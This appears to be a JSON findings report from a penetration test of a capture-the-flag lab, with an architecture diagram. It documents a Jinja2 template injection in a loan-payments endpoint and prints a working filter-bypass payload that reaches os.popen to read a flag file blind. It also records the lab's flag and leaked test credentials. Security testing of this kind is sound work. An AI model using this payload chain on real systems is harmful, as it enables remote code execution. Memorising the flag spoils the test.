@@ -1,0 +1,27 @@
+{
+  "meta": {
+    "created": "2026-04-13T11:14:27.825875+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "e2033aec-e903-4332-ae21-3d6131f9a42a",
+      "timestamp": "2026-04-13T11:14:27.825699+00:00",
+      "title": "SSTI via Jinja2 Template Injection in /total_loan_payments principal parameter",
+      "severity": "critical",
+      "target": "http://172.17.0.1:49653/total_loan_payments",
+      "description": "Server-Side Template Injection (SSTI) in the `principal` GET parameter of the /total_loan_payments endpoint. The application builds JSON responses using Jinja2's render_template_string() with user-controlled input concatenated directly into the template string. The application applies input filters blocking `{{`, `}}`, `.`, `_`, and `[`, but these are bypassed using: (1) Jinja2 `{% if/for %}` block tags instead of `{{ }}` expressions; (2) `\\x5f` escape sequences for underscores in string literals; (3) `|attr()` filter for attribute/method access without dots; (4) `|list` and `loop|attr('index0')` for character iteration without brackets. This allows full RCE via `lipsum.__globals__['os'].popen('cmd').read()`. The flag was extracted from /flag via blind boolean oracle.",
+      "evidence": "FLAG EXTRACTED: flag{135a9252-0502-484d-a4c3-30a3d4806075}\n\nVerified via Jinja2 SSTI with filter bypass:\n1. Login with leaked credentials test:test (found in HTML comment)\n2. Send: GET /total_loan_payments?principal={% set r=lipsum|attr(\"\\x5f\\x5fglobals\\x5f\\x5f\")|attr(\"get\")(\"os\")|attr(\"popen\")(\"cat /flag\")|attr(\"read\")() %}{% for c in r|list %}{% if (loop|attr(\"index0\")) == N %}{% if c > \"CHAR\" %}1{% else %}0{% endif %}{% endif %}{% endfor %}&payment=212&term=60\n3. Binary-search all 42 characters \u2192 flag{135a9252-0502-484d-a4c3-30a3d4806075}",
+      "tool_used": "manual/http_request",
+      "cve": ""
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "68331ea8-be3c-42f0-9de1-ad512f9705e1",
+      "timestamp": "2026-04-13T11:14:39.890182+00:00",
+      "title": "Application Architecture",
+      "mermaid": "flowchart TD\n  Browser[\"Browser\"] --> Login[\"/login POST\"]\n  Browser --> Home[\"/home GET\"]\n  Browser --> Profile[\"/profile GET/POST\"]\n  Browser --> LoanDetails[\"/loan_details GET\"]\n  LoanDetails -->|\"AJAX GET\"| TotalLoan[\"/total_loan_payments GET\"]\n  TotalLoan -->|\"SSTI via principal param\"| Jinja2[\"Jinja2 render_template_string\"]\n  Jinja2 -->|\"RCE chain\"| OS[\"os.popen - System Commands\"]\n  OS -->|\"cat /flag\"| Flag[\"/flag file - CTF Flag\"]\n  Login --> DB[\"SQLite DB - Users\"]\n  DB -->|\"test:test credentials in HTML comment\"| Browser"
+    }
+  ]
+}
